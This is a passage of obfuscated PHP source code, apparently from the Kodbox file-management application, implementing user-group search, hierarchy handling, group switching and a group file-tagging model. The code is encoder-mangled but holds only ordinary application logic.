"\x73\145\154\x65\143\164\40\147\162\157\x75\160\x49\x44\40\x66\x72\x6f\x6d\40\x60\147\162\157\x75\x70\140\x20\x77\x68\145\162\145\40\160\x61\162\145\156\x74\114\145\x76\x65\x6c\40\154\151\153\x65\40\x27{$ËÁû†š§[$Ş¾ŠÀ§œ[588]]}{$ËÁû†š§[$Ş¾ŠÀ§œ[1414]]}\54\x25\x27"; } $üÒÒûÛÁ = implode($Ş¾ŠÀ§œ[2104], $üÒÒûÛÁ); $á„í÷­ = $this->query($üÒÒûÛÁ); if (!$á„í÷­) { return array(); } $·¡Ìšœ® = array_to_keyvalue($á„í÷­, $Ş¾ŠÀ§œ[12], $Ş¾ŠÀ§œ[1414]); return array_unique($·¡Ìšœ®); } public function listByID($†éÖ”) { $¸Õ“ÎšÂ =& $_SERVER[¯‘·½]; if (!$†éÖ”) { return array(); } $œ˜§£¥– = array($¸Õ“ÎšÂ[1414] => array($¸Õ“ÎšÂ[7], $†éÖ”)); $Ö×áÔš¸ = $this->where($œ˜§£¥–)->select(); $Ö×áÔš¸ = array_sort_keep($Ö×áÔš¸, $¸Õ“ÎšÂ[1414], $†éÖ”); $this->_listDataApply($Ö×áÔš¸); return $Ö×áÔš¸; } public function listSearch($¤ÆÓñ­Ê) { $İÓ‹Äˆ® =& $_SERVER[¯‘·½]; $´¢‹Ê = trim($¤ÆÓñ­Ê[$İÓ‹Äˆ®[2105]]); $ ê€¼Ó˜ = explode($İÓ‹Äˆ®[53], $´¢‹Ê); if (!$´¢‹Ê || count($ ê€¼Ó˜) == 1) { return $this->listSearchNow($¤ÆÓñ­Ê); } $±îú¢³ = array($İÓ‹Äˆ®[447] => array()); foreach ($ ê€¼Ó˜ as $øÙÒÇĞµ) { if (!trim($øÙÒÇĞµ)) { continue; } $¤ÆÓñ­Ê[$İÓ‹Äˆ®[2105]] = $øÙÒÇĞµ; $åÃ³Æü‚ = $this->listSearchNow($¤ÆÓñ­Ê); $±îú¢³[$İÓ‹Äˆ®[447]] = array_merge($±îú¢³[$İÓ‹Äˆ®[447]], $åÃ³Æü‚[$İÓ‹Äˆ®[447]]); } $±îú¢³[$İÓ‹Äˆ®[447]] = array_unique_by_key($±îú¢³[$İÓ‹Äˆ®[447]], $İÓ‹Äˆ®[1414]); $±îú¢³[$İÓ‹Äˆ®[444]] = array($İÓ‹Äˆ®[445] => count($±îú¢³[$İÓ‹Äˆ®[447]]), $İÓ‹Äˆ®[441] => 20, $İÓ‹Äˆ®[430] => 1, $İÓ‹Äˆ®[446] => 1); return $±îú¢³; } public function listSearchNow($²ÛÃ„§‰) { $…ÂÕ˜§° =& $_SERVER[¯‘·½]; $ü¯Îú™ = trim($²ÛÃ„§‰[$…ÂÕ˜§°[2105]]); $Ø’½ƒØ = isset($²ÛÃ„§‰[$…ÂÕ˜§°[2106]]) ? $²ÛÃ„§‰[$…ÂÕ˜§°[2106]] : !1; if (!trim($ü¯Îú™)) { return !1; } $ü¯Îú™ = str_replace($…ÂÕ˜§°[2107], $…ÂÕ˜§°[2108], $ü¯Îú™); $£Ä ò˜è = array($…ÂÕ˜§°[1414] => array($…ÂÕ˜§°[461], "{$ü¯Îú™}\x25"), $…ÂÕ˜§°[32] => array($…ÂÕ˜§°[461], "\x25{$ü¯Îú™}\45"), $…ÂÕ˜§°[1096] => $…ÂÕ˜§°[2109]); if ($Ø’½ƒØ) { $áîŞ˜¸ = $this->getInfoSimple($Ø’½ƒØ); $˜€×¶ò¨ = $áîŞ˜¸[$…ÂÕ˜§°[588]] . $Ø’½ƒØ . $…ÂÕ˜§°[620]; $£Ä ò˜è = array($£Ä ò˜è, array($…ÂÕ˜§°[588] => array($…ÂÕ˜§°[461], $˜€×¶ò¨))); } $£Ä ò˜è = $this->parseWhereLike($£Ä ò˜è); $ñŞİ°™Î = $this->_makeOrder()->where($£Ä ò˜è)->selectPage(20); $ñŞİ°™Î = $ñŞİ°™Î ? $ñŞİ°™Î : array($…ÂÕ˜§°[447] => array(), $…ÂÕ˜§°[444] => array()); if (!$ñŞİ°™Î || count($ñŞİ°™Î[$…ÂÕ˜§°[447]]) < 5 && Input::check($ü¯Îú™, $…ÂÕ˜§°[395])) { $ùğäÇÖ˜ = $this->groupChildrenAll($Ø’½ƒØ); $šè¾Ùâ = $this->_searchFromMeta($…ÂÕ˜§°[539], $ü¯Îú™, 10, $ùğäÇÖ˜); $ÊÑìõÖ» = $this->_searchFromMeta($…ÂÕ˜§°[540], $ü¯Îú™, 10, $ùğäÇÖ˜); $€Ù¦­Ï = array_merge($šè¾Ùâ, $ÊÑìõÖ», $ñŞİ°™Î[$…ÂÕ˜§°[447]]); $ñŞİ°™Î[$…ÂÕ˜§°[447]] = array_unique_by_key($€Ù¦­Ï, $…ÂÕ˜§°[1414]); $ñŞİ°™Î[$…ÂÕ˜§°[444]][$…ÂÕ˜§°[445]] = count($ñŞİ°™Î[$…ÂÕ˜§°[447]]); $ñŞİ°™Î[$…ÂÕ˜§°[444]][$…ÂÕ˜§°[446]] = ceil($ñŞİ°™Î[$…ÂÕ˜§°[444]][$…ÂÕ˜§°[445]] / $ñŞİ°™Î[$…ÂÕ˜§°[444]][$…ÂÕ˜§°[441]]); } $this->_listDataApply($ñŞİ°™Î[$…ÂÕ˜§°[447]]); return $ñŞİ°™Î; } protected function groupChildrenAll($‡Øîü·Ã) { $ß¸ß¥úÈ =& $_SERVER[¯‘·½]; if (!$‡Øîü·Ã) { return !1; } if (!is_array($‡Øîü·Ã)) { $‡Øîü·Ã = array($‡Øîü·Ã); } $Û˜ƒÛù = $‡Øîü·Ã; foreach ($‡Øîü·Ã as $×•ËÕâß) { $÷“‚›Â• = $this->getInfoSimple($×•ËÕâß); $ä¶‡âÌ = array($ß¸ß¥úÈ[588] => array($ß¸ß¥úÈ[461], $÷“‚›Â•[$ß¸ß¥úÈ[588]] . $×•ËÕâß . $ß¸ß¥úÈ[620])); $õš¬Äßî = $this->field($ß¸ß¥úÈ[1414])->where($ä¶‡âÌ)->select(); $Û˜ƒÛù = array_merge($Û˜ƒÛù, array_to_keyvalue($õš¬Äßî, $ß¸ß¥úÈ[12], $ß¸ß¥úÈ[1414])); } return array_unique($Û˜ƒÛù); } private function _searchFromMeta($áŞ·Ùõö, $ë¯ãÑ°ñ, $Ù÷×Ì²Æ, $®¨«Ùœ) { $é—ıÖç =& $_SERVER[¯‘·½]; $ë¯ãÑ°ñ = strtolower($ë¯ãÑ°ñ); $¸‚ˆ³å = array($é—ıÖç[97] => $áŞ·Ùõö, $é—ıÖç[452] => array($é—ıÖç[461], "\45{$ë¯ãÑ°ñ}\45")); $¸‚ˆ³å = $this->parseWhereLike($¸‚ˆ³å); if ($®¨«Ùœ) { $¸‚ˆ³å[$é—ıÖç[1414]] = array($é—ıÖç[7], $®¨«Ùœ); } $éÄòø©… = Model($é—ıÖç[2110])->where($¸‚ˆ³å)->limit($Ù÷×Ì²Æ)->select(); if (!$éÄòø©…) { return array(); } $éÄòø©… = array_to_keyvalue($éÄòø©…, $é—ıÖç[12], $é—ıÖç[1414]); $™ùÃ§è = $this->where(array($é—ıÖç[2096] => array($é—ıÖç[7], $éÄòø©…)))->select(); if (!$™ùÃ§è) { return array(); } return $™ùÃ§è; } protected function _listDataApplyItem($±—Äî‹) { $ÑÌ¬›™ú = array($±—Äî‹); $this->_listDataApply($ÑÌ¬›™ú); return $ÑÌ¬›™ú[0]; } protected function _listDataApply(&$°™¹ß½Ú) { $Şê¶¤”± =& $_SERVER[¯‘·½]; if (!$°™¹ß½Ú) { return; } $é¢Å° = array_to_keyvalue($°™¹ß½Ú, $Şê¶¤”±[12], $Şê¶¤”±[1414]); $this->_listAppendChildren($°™¹ß½Ú); $this->_listAppendChildrenMember($°™¹ß½Ú); $this->_listAppendMeta($°™¹ß½Ú, $é¢Å°); $this->_listAppendParent($°™¹ß½Ú); $this->_listAppendSourceRoot($°™¹ß½Ú, $é¢Å°); } private function _listAppendChildren(&$ÍÑŞ©òı) { $¥¼‰¢ó‘ =& $_SERVER[¯‘·½]; $‹½º…µ¸ = array_to_keyvalue($ÍÑŞ©òı, $¥¼‰¢ó‘[12], $¥¼‰¢ó‘[1414]); $’æÚÄó³ = array($¥¼‰¢ó‘[193] => array($¥¼‰¢ó‘[7], $‹½º…µ¸)); $¥ãÏôÇÓ = array($¥¼‰¢ó‘[193], $¥¼‰¢ó‘[2111] => $¥¼‰¢ó‘[569]); $ãı”èü× = $this->field($¥ãÏôÇÓ)->where($’æÚÄó³)->group($¥¼‰¢ó‘[193])->select(); $şÃàü¹š = array_to_keyvalue($ãı”èü×, $¥¼‰¢ó‘[193], $¥¼‰¢ó‘[569]); foreach ($ÍÑŞ©òı as &$åÍåÔ„ç) { $ƒÔÀ¶¨† = $åÍåÔ„ç[$¥¼‰¢ó‘[1414]]; $åÍåÔ„ç[$¥¼‰¢ó‘[2112]] = isset($şÃàü¹š[$ƒÔÀ¶¨†]) ? intval($şÃàü¹š[$ƒÔÀ¶¨†]) : !1; } unset($åÍåÔ„ç); } private function _listAppendChildrenMember(&$¡â‰¯†Ü) { $¶¢¢† =& $_SERVER[¯‘·½]; $–ôƒŠ—º = array_to_keyvalue($¡â‰¯†Ü, $¶¢¢†[12], $¶¢¢†[1414]); $¯Ÿ¿Áñ = array($¶¢¢†[1414] => array($¶¢¢†[7], $–ôƒŠ—º)); $¡¡’ñ÷õ = array($¶¢¢†[1414], $¶¢¢†[2111] => $¶¢¢†[569]); $³–¸üÙ» = Model($¶¢¢†[2101])->field($¡¡’ñ÷õ)->where($¯Ÿ¿Áñ)->group($¶¢¢†[1414])->select(); $üÍİ÷¾Ç = array_to_keyvalue($³–¸üÙ», $¶¢¢†[1414], $¶¢¢†[569]); foreach ($¡â‰¯†Ü as &$ğÕìòÄú) { $¥åêˆ§¶ = $ğÕìòÄú[$¶¢¢†[1414]]; $ğÕìòÄú[$¶¢¢†[2113]] = isset($üÍİ÷¾Ç[$¥åêˆ§¶]) ? intval($üÍİ÷¾Ç[$¥åêˆ§¶]) : !1; } unset($ğÕìòÄú); } private function _listAppendMeta(&$ÄëÌôŠê, $’ÖºŠ¿) { $˜Òß­Î¶ =& $_SERVER[¯‘·½]; $¡îëû°Ê = array($˜Òß­Î¶[1414] => array($˜Òß­Î¶[7], $’ÖºŠ¿)); $Ö’Ù¤Å¢ = Model($˜Òß­Î¶[2100])->where($¡îëû°Ê)->select(); $Ö’Ù¤Å¢ = array_to_keyvalue_group($Ö’Ù¤Å¢, $˜Òß­Î¶[1414]); foreach ($Ö’Ù¤Å¢ as &$ã‰ÂÜó–) { $ã‰ÂÜó– = array_to_keyvalue($ã‰ÂÜó–, $˜Òß­Î¶[97], $˜Òß­Î¶[452]); } unset($ã‰ÂÜó–); foreach ($ÄëÌôŠê as &$–ÉãñÂ) { $–ÉãñÂ[$˜Òß­Î¶[543]] = array(); if (isset($Ö’Ù¤Å¢[$–ÉãñÂ[$˜Òß­Î¶[1414]]])) { $–ÉãñÂ[$˜Òß­Î¶[543]] = $Ö’Ù¤Å¢[$–ÉãñÂ[$˜Òß­Î¶[1414]]]; } } unset($–ÉãñÂ); } protected function parentLevelArray($”ë•‹ÛÖ) { $³·ÙÏ©Ë =& $_SERVER[¯‘·½]; $”ë•‹ÛÖ = explode($³·ÙÏ©Ë[50], trim($”ë•‹ÛÖ, $³·ÙÏ©Ë[50])); $”ë•‹ÛÖ = array_remove_value($”ë•‹ÛÖ, $³·ÙÏ©Ë[231]); return $”ë•‹ÛÖ; } protected function parentInGroup($¥Ğú´ëÆ, $¶¸òè”Î) { $ŠÓïÛñ¿ =& $_SERVER[¯‘·½]; $îìşÏİİ = $this->getInfoSimple($¥Ğú´ëÆ); if (!$îìşÏİİ) { return !0; } $óÔÍÜ‰ = $this->parentLevelArray($îìşÏİİ[$ŠÓïÛñ¿[588]]); $óÔÍÜ‰[] = $¥Ğú´ëÆ; foreach ($óÔÍÜ‰ as $¥Ğú´ëÆ) { if (in_array($¥Ğú´ëÆ . $ŠÓïÛñ¿[12], $¶¸òè”Î)) { return !0; } } return !1; } private function _listAppendParent(&$­Ï·¢é­) { $ĞÎØ¶¹ =& $_SERVER[¯‘·½]; $˜û¹¯Æİ = array(); foreach ($­Ï·¢é­ as &$µÃ¥½Ñù) { $˜û¹¯Æİ[$µÃ¥½Ñù[$ĞÎØ¶¹[1414]]] = $µÃ¥½Ñù[$ĞÎØ¶¹[32]]; $²®íĞ©€ = $this->parentLevelArray($µÃ¥½Ñù[$ĞÎØ¶¹[588]]); foreach ($²®íĞ©€ as $¢›ªœ‘Ü) { if (!isset($˜û¹¯Æİ[$¢›ªœ‘Ü])) { $˜û¹¯Æİ[$¢›ªœ‘Ü] = 0; } } } unset($µÃ¥½Ñù); foreach ($˜û¹¯Æİ as $³œ¨Å‚… => $¤ì˜ğ´–) { if ($¤ì˜ğ´–) { continue; } $ìø÷¼êÅ = $this->getInfoSimple($³œ¨Å‚…); $˜û¹¯Æİ[$³œ¨Å‚…] = $ìø÷¼êÅ[$ĞÎØ¶¹[32]]; } $Ø¢áşÂÇ = $GLOBALS[$ĞÎØ¶¹[6]][$ĞÎØ¶¹[92]][$ĞÎØ¶¹[2114]]; if (KodUser::isRoot()) { $Ø¢áşÂÇ = !1; } foreach ($­Ï·¢é­ as &$µÃ¥½Ñù) { $²®íĞ©€ = $this->parentLevelArray($µÃ¥½Ñù[$ĞÎØ¶¹[588]]); $Ë×›ÏŞ = $ĞÎØ¶¹[12]; foreach ($²®íĞ©€ as $³œ¨Å‚… => $¢›ªœ‘Ü) { if ($Ø¢áşÂÇ && $³œ¨Å‚… == 0) { continue; } $Ë×›ÏŞ .= $˜û¹¯Æİ[$¢›ªœ‘Ü] . $ĞÎØ¶¹[8]; } if ($²®íĞ©€) { $Ë×›ÏŞ .= $µÃ¥½Ñù[$ĞÎØ¶¹[32]]; } $µÃ¥½Ñù[$ĞÎØ¶¹[593]] = str_replace($ĞÎØ¶¹[257], $ĞÎØ¶¹[8], $Ë×›ÏŞ); } unset($µÃ¥½Ñù); } private function _listAppendSourceRoot(&$îÁ³ŸÍ’, $ÛòÓİ) { $õ„ëµÎ =& $_SERVER[¯‘·½]; $çÔ’÷¿ˆ = Model($õ„ëµÎ[916])->listSourceRoot(SourceModel::TYPE_GROUP, $ÛòÓİ); $çÔ’÷¿ˆ = array_to_keyvalue($çÔ’÷¿ˆ, $õ„ëµÎ[573]); $çÔ’÷¿ˆ = array_remove_key($çÔ’÷¿ˆ, $õ„ëµÎ[573]); foreach ($îÁ³ŸÍ’ as &$îËöİãú) { $îËöİãú[$õ„ëµÎ[90]] = $çÔ’÷¿ˆ[$îËöİãú[$õ„ëµÎ[1414]]] ? $çÔ’÷¿ˆ[$îËöİãú[$õ„ëµÎ[1414]]] : array(); } unset($îËöİãú); } protected function groupMerge($á–¬†¤) { $á–¬†¤ = array_values(array_unique($á–¬†¤)); $÷°°†œğ = array(); for ($ŠÙ˜·¤Æ = 0; $ŠÙ˜·¤Æ < count($á–¬†¤); $ŠÙ˜·¤Æ++) { $ÃËÓ¨š¶ = !1; for ($ˆÄ¼àğŒ = 0; $ˆÄ¼àğŒ < count($á–¬†¤); $ˆÄ¼àğŒ++) { if ($ŠÙ˜·¤Æ == $ˆÄ¼àğŒ) { continue; } if ($this->isParentOf($á–¬†¤[$ˆÄ¼àğŒ], $á–¬†¤[$ŠÙ˜·¤Æ])) { $ÃËÓ¨š¶ = !0; break; } } if (!$ÃËÓ¨š¶) { $÷°°†œğ[] = $á–¬†¤[$ŠÙ˜·¤Æ]; } } return $÷°°†œğ; } protected function isParentOf($óŞøÖô, $¯Ó¨¡”) { $éüñäËÚ =& $_SERVER[¯‘·½]; if (!$óŞøÖô || !$¯Ó¨¡” || $óŞøÖô == $¯Ó¨¡”) { return !1; } $ÕÖ›Ê©ó = $this->getInfoSimple($óŞøÖô); $Š¹œ»ĞË = $this->getInfoSimple($¯Ó¨¡”); $²ä¹Ü†« = $ÕÖ›Ê©ó[$éüñäËÚ[588]] . $óŞøÖô . $éüñäËÚ[50]; if (substr($Š¹œ»ĞË[$éüñäËÚ[588]], 0, strlen($²ä¹Ü†«)) == $²ä¹Ü†«) { return !0; } return !1; } public function groupShowRoot($½ƒŞ˜ÎÖ, $ÁıËºÃÑ = false) { $¤É‡Ì»÷ =& $_SERVER[¯‘·½]; $óõà¯ = $this->getInfo($½ƒŞ˜ÎÖ); if (!$óõà¯) { return array(); } $¤Ó•€€Å = $this->parentLevelArray($óõà¯[$¤É‡Ì»÷[588]]); $÷ÒØ±ˆì = array($½ƒŞ˜ÎÖ); if (count($¤Ó•€€Å) == 0) { return $÷ÒØ±ˆì; } if ($ÁıËºÃÑ && count($¤Ó•€€Å) == 1) { return $÷ÒØ±ˆì; } if (!$óõà¯[$¤É‡Ì»÷[543]] || !isset($óõà¯[$¤É‡Ì»÷[543]][$¤É‡Ì»÷[2097]]) || $óõà¯[$¤É‡Ì»÷[543]][$¤É‡Ì»÷[2097]] == $¤É‡Ì»÷[862]) { return $this->groupShowRoot($¤Ó•€€Å[count($¤Ó•€€Å) - 1], $ÁıËºÃÑ); } if ($óõà¯[$¤É‡Ì»÷[543]][$¤É‡Ì»÷[2097]] == $¤É‡Ì»÷[434]) { $î”µ¼ïŸ = explode($¤É‡Ì»÷[50], $óõà¯[$¤É‡Ì»÷[543]][$¤É‡Ì»÷[2098]]); if ($î”µ¼ïŸ) { $÷ÒØ±ˆì = array_merge($÷ÒØ±ˆì, $î”µ¼ïŸ); } } return $÷ÒØ±ˆì; } protected function resetParentLevel() { $ö»£€êÜ =& $_SERVER[¯‘·½]; $·ÄÆˆ¢¬ = $ö»£€êÜ[1414]; $½ìÒŸ¨ = $this->select(); $½ìÒŸ¨ = array_to_keyvalue($½ìÒŸ¨, $·ÄÆˆ¢¬); foreach ($½ìÒŸ¨ as $ÜÜ­æü÷) { $˜¥ŸìØ = $ÜÜ­æü÷; $şèÆÈêÓ = array(); while ($˜¥ŸìØ[$ö»£€êÜ[193]] != 0) { $şèÆÈêÓ[] = $˜¥ŸìØ[$ö»£€êÜ[193]]; $˜¥ŸìØ = $½ìÒŸ¨[$˜¥ŸìØ[$ö»£€êÜ[193]]]; } $şèÆÈêÓ[] = 0; $şèÆÈêÓ = $ö»£€êÜ[50] . implode($ö»£€êÜ[50], array_reverse($şèÆÈêÓ)) . $ö»£€êÜ[50]; $this->setNamePinyin($ÜÜ­æü÷[$·ÄÆˆ¢¬], $ÜÜ­æü÷[$ö»£€êÜ[32]]); $this->where(array($·ÄÆˆ¢¬ => $ÜÜ­æü÷[$·ÄÆˆ¢¬]))->save(array($ö»£€êÜ[659] => $şèÆÈêÓ)); } return $½ìÒŸ¨; } public function groupNameAuto($Àúá†şÇ, $Šë¯Í) { $³¯¬’ =& $_SERVER[¯‘·½]; $¤¹ŒÈ = $this->where(array($³¯¬’[479] => $Àúá†şÇ))->getField($³¯¬’[32], !0); if (!$¤¹ŒÈ || !in_array($Šë¯Í, $¤¹ŒÈ)) { return $Šë¯Í; } for ($Ş¥íó¥‰ = 1; $Ş¥íó¥‰ <= count($¤¹ŒÈ) + 1; $Ş¥íó¥‰++) { $¯úÏÒºş = $Šë¯Í . "\50{$Ş¥íó¥‰}\51"; if (!in_array($¯úÏÒºş, $¤¹ŒÈ)) { return $¯úÏÒºş; } } } public function groupSwitch($úªşàµ·, $±™˜Ö­–) { $›—‹ÍŞ× =& $_SERVER[¯‘·½]; $Ö¶à»Óá = array($›—‹ÍŞ×[1414] => array($›—‹ÍŞ×[7], array($úªşàµ·, $±™˜Ö­–))); $ú¾®Ã—Ä = $this->where($Ö¶à»Óá)->select(); $ú¾®Ã—Ä = array_to_keyvalue($ú¾®Ã—Ä, $›—‹ÍŞ×[1414]); if (!isset($ú¾®Ã—Ä[$úªşàµ·]) || !isset($ú¾®Ã—Ä[$±™˜Ö­–]) || $ú¾®Ã—Ä[$úªşàµ·][$›—‹ÍŞ×[193]] == 0) { return !1; } $Ö¶à»Óá = array($›—‹ÍŞ×[1414] => $úªşàµ·); $“•¯»ÃÁ = Model($›—‹ÍŞ×[2101])->where($Ö¶à»Óá)->select(); if (!$“•¯»ÃÁ) { $“•¯»ÃÁ = array(); } foreach ($“•¯»ÃÁ as $Şú¼ò¸±) { $ç•ãÄíœ = $Şú¼ò¸±[$›—‹ÍŞ×[1806]]; $Ö¶à»Óá = array($›—‹ÍŞ×[1806] => $ç•ãÄíœ, $›—‹ÍŞ×[1414] => $±™˜Ö­–); $ß÷ëµŞ = Model($›—‹ÍŞ×[2101])->where($Ö¶à»Óá)->find(); if (!$ß÷ëµŞ) { $êîƒ°ÀŞ = array($±™˜Ö­– => $Şú¼ò¸±[$›—‹ÍŞ×[2115]]); Model($›—‹ÍŞ×[601])->userGroupAdd($ç•ãÄíœ, $êîƒ°ÀŞ); } Model($›—‹ÍŞ×[601])->userGroupRemove($ç•ãÄíœ, $úªşàµ·); } $Ö¶à»Óá = array($›—‹ÍŞ×[191] => 2, $›—‹ÍŞ×[193] => 0, $›—‹ÍŞ×[487] => 1, $›—‹ÍŞ×[573] => array($›—‹ÍŞ×[7], array($úªşàµ·, $±™˜Ö­–))); $¿‰û³“Ø = Model($›—‹ÍŞ×[916])->where($Ö¶à»Óá)->field($›—‹ÍŞ×[2116])->select(); $¿‰û³“Ø = array_to_keyvalue($¿‰û³“Ø, $›—‹ÍŞ×[573], $›—‹ÍŞ×[194]); $øè”ù•ƒ = !empty($¿‰û³“Ø[$úªşàµ·]) ? $¿‰û³“Ø[$úªşàµ·] : !1; if ($øè”ù•ƒ) { if (!$¿‰û³“Ø[$±™˜Ö­–]) { $¿‰û³“Ø[$±™˜Ö­–] = Model($›—‹ÍŞ×[916])->groupRootAdd($±™˜Ö­–); } $¹Œóñˆü = $¿‰û³“Ø[$±™˜Ö­–]; $Ö¶à»Óá = array($›—‹ÍŞ×[193] => $øè”ù•ƒ); $¿‰û³“Ø = Model($›—‹ÍŞ×[916])->where($Ö¶à»Óá)->field($›—‹ÍŞ×[2117])->select(); if (!$¿‰û³“Ø) { $¿‰û³“Ø = array(); } Model($›—‹ÍŞ×[916])->moveClearAuth = !1; foreach ($¿‰û³“Ø as $ã¬Æê½Û) { $íÉºı‡À = $ã¬Æê½Û[$›—‹ÍŞ×[487]] == $›—‹ÍŞ×[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($›—‹ÍŞ×[916])->move($ã¬Æê½Û[$›—‹ÍŞ×[194]], $¹Œóñˆü, $íÉºı‡À); } Model($›—‹ÍŞ×[916])->moveClearAuth = !0; $Ö¶à»Óá = array($›—‹ÍŞ×[191] => 2, $›—‹ÍŞ×[573] => $úªşàµ·); $¡ÓÖĞº = array($›—‹ÍŞ×[573] => $±™˜Ö­–); Model($›—‹ÍŞ×[2118])->where($Ö¶à»Óá)->save($¡ÓÖĞº); Model($›—‹ÍŞ×[2119])->where($Ö¶à»Óá)->save($¡ÓÖĞº); } $this->_changeChildLevel($ú¾®Ã—Ä[$úªşàµ·], $ú¾®Ã—Ä[$±™˜Ö­–], !0); $this->where(array($›—‹ÍŞ×[193] => $úªşàµ·))->save(array($›—‹ÍŞ×[193] => $±™˜Ö­–)); $this->_clearChildrenCache($ú¾®Ã—Ä[$±™˜Ö­–]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($ñîëŸ—) { $ç¯í»¸ =& $_SERVER[¯‘·½]; return array($ç¯í»¸[2120] => array($ñîëŸ—[0], $ç¯í»¸[2121]), $ç¯í»¸[2122] => array($ñîëŸ—[0], $ç¯í»¸[2123])); } protected function get($«Â¥ÑøÙ) { $ÀÜ àŠÏ =& $_SERVER[¯‘·½]; $Şåıå¤¾ = Model($ÀÜ àŠÏ[589])->metaGet($«Â¥ÑøÙ, $ÀÜ àŠÏ[2124]); $Ÿ²šË©€ = json_decode($Şåıå¤¾, !0); return $Ÿ²šË©€ ? $Ÿ²šË©€ : array($ÀÜ àŠÏ[2125] => $ÀÜ àŠÏ[91], $ÀÜ àŠÏ[447] => array()); } protected function set($Ş–Îöü¯, $×Äé”ëÆ) { $»¼Ñ‹¿× =& $_SERVER[¯‘·½]; $×Äé”ëÆ = $×Äé”ëÆ ? $×Äé”ëÆ : array($»¼Ñ‹¿×[2125] => $»¼Ñ‹¿×[91], $»¼Ñ‹¿×[447] => array()); return Model($»¼Ñ‹¿×[589])->metaSet($Ş–Îöü¯, $»¼Ñ‹¿×[2124], json_encode($×Äé”ëÆ)); } protected function getByTagID($Óù¯Œâ, $¯«‘Áº) { $ô·ÄÕÒ» =& $_SERVER[¯‘·½]; if (!$Óù¯Œâ || !$¯«‘Áº) { return !1; } if (!Model($ô·ÄÕÒ»[589])->getInfoSimple($Óù¯Œâ)) { return !1; } $¥ÙÓƒÇñ = $this->get($Óù¯Œâ); if (!$¥ÙÓƒÇñ || !isset($¥ÙÓƒÇñ[$ô·ÄÕÒ»[447]])) { return !1; } $•ß°ùêë = array_find_by_field($¥ÙÓƒÇñ[$ô·ÄÕÒ»[447]], $ô·ÄÕÒ»[477], $¯«‘Áº); return is_array($•ß°ùêë) ? $•ß°ùêë : !1; } public function listSource($Äµ«¸¥ì, $Á‰ŒË«Ÿ) { $Çõ´ûÁ° =& $_SERVER[¯‘·½]; if ($Á‰ŒË«Ÿ && !is_array($Á‰ŒË«Ÿ)) { $Á‰ŒË«Ÿ = array($Á‰ŒË«Ÿ); } $‡õ„íÚı = $this->listData($Äµ«¸¥ì); $ú½áÍâ = array(); foreach ($‡õ„íÚı as $ğ¢ÁÍœ£) { $ùà”Íú÷ = $ğ¢ÁÍœ£[$Çõ´ûÁ°[87]]; if (!$ùà”Íú÷) { continue; } if (!isset($ú½áÍâ[$ùà”Íú÷])) { $ú½áÍâ[$ùà”Íú÷] = array(); } $ú½áÍâ[$ùà”Íú÷][] = $ğ¢ÁÍœ£[$Çõ´ûÁ°[502]]; } $ÓĞ“Ëí = array(); foreach ($ú½áÍâ as $Ö©Ÿõ†ü => $İ˜ÂÏŞ) { $à”ò€ÓŒ = !0; if (!$Á‰ŒË«Ÿ) { $ÓĞ“Ëí[] = $Ö©Ÿõ†ü; continue; } foreach ($Á‰ŒË«Ÿ as $‘î¢ûÓæ) { if (!in_array($‘î¢ûÓæ, $İ˜ÂÏŞ)) { $à”ò€ÓŒ = !1; break; } } if ($à”ò€ÓŒ) { $ÓĞ“Ëí[] = $Ö©Ÿõ†ü; } } if (!$ÓĞ“Ëí) { return array(); } $äÍÖ¦Í = array($Çõ´ûÁ°[493] => array($Çõ´ûÁ°[494], $ÓĞ“Ëí), $Çõ´ûÁ°[573] => $Äµ«¸¥ì, $Çõ´ûÁ°[191] => SourceModel::TYPE_GROUP); $·¯é¹­â = Model($Çõ´ûÁ°[1452])->listSource($äÍÖ¦Í); if (!$·¯é¹­â || count($ÓĞ“Ëí) == $·¯é¹­â[$Çõ´ûÁ°[444]][$Çõ´ûÁ°[445]]) { return $·¯é¹­â; } $èÂœÆâ = array(); $ÖŠ½Õ¿È = array_to_keyvalue($·¯é¹­â[$Çõ´ûÁ°[85]], $Çõ´ûÁ°[12], $Çõ´ûÁ°[194]); $çÏÛÏğˆ = array_to_keyvalue($·¯é¹­â[$Çõ´ûÁ°[86]], $Çõ´ûÁ°[12], $Çõ´ûÁ°[194]); $ì´™Ò´× = array_merge($çÏÛÏğˆ, $ÖŠ½Õ¿È); foreach ($ÓĞ“Ëí as $ùà”Íú÷) { if (!in_array($ùà”Íú÷, $ì´™Ò´×)) { $èÂœÆâ[] = $ùà”Íú÷; } } if ($èÂœÆâ) { $this->removeBySource($Äµ«¸¥ì, $èÂœÆâ); } return $·¯é¹­â; } protected function listData($Şîß±«ı) { $‹ÖØ»Ú =& $_SERVER[¯‘·½]; $õƒ©ë‹´ = array($‹ÖØ»Ú[1797] => 0, $‹ÖØ»Ú[561] => array($‹ÖØ»Ú[2126], 0), $‹ÖØ»Ú[498] => $‹ÖØ»Ú[1410] . $Şîß±«ı); $‡‚´¥ûµ = $‹ÖØ»Ú[2127]; $‹ñ§ıó÷ = $this->field($‡‚´¥ûµ)->where($õƒ©ë‹´)->order($‹ÖØ»Ú[2128])->select(); return $‹ñ§ıó÷ ? $‹ñ§ıó÷ : array(); } protected function addToTag($ƒÚ—èôÁ, $­İ²ùæ¬, $Â’ä»Ç£) { $‡€ëĞ² =& $_SERVER[¯‘·½]; if (!$this->getByTagID($ƒÚ—èôÁ, $Â’ä»Ç£) || !$­İ²ùæ¬) { return !1; } if (!Model($‡€ëĞ²[916])->pathInfo($­İ²ùæ¬)) { return !1; } $¹ÚéŒ¹¤ = array($‡€ëĞ²[1797] => 0, $‡€ëĞ²[561] => $Â’ä»Ç£, $‡€ëĞ²[497] => $­İ²ùæ¬, $‡€ëĞ²[498] => $‡€ëĞ²[2129] . $ƒÚ—èôÁ, $‡€ëĞ²[496] => $‡€ëĞ²[12], $‡€ëĞ²[2010] => 0); if ($this->where($¹ÚéŒ¹¤)->find()) { return !1; } return $this->add($¹ÚéŒ¹¤); } protected function removeFromTag($ó€Õ Ê˜, $¢–ÌÍº, $©¬ä›÷) { $ˆÊ´™â =& $_SERVER[¯‘·½]; if (!$this->getByTagID($ó€Õ Ê˜, $©¬ä›÷) || !$¢–ÌÍº) { return !1; } if (is_array($¢–ÌÍº)) { $¢–ÌÍº = array($ˆÊ´™â[7], $¢–ÌÍº); } $áí¡ÛÆØ = array($ˆÊ´™â[1797] => 0, $ˆÊ´™â[561] => $©¬ä›÷, $ˆÊ´™â[498] => $ˆÊ´™â[2129] . $ó€Õ Ê˜, 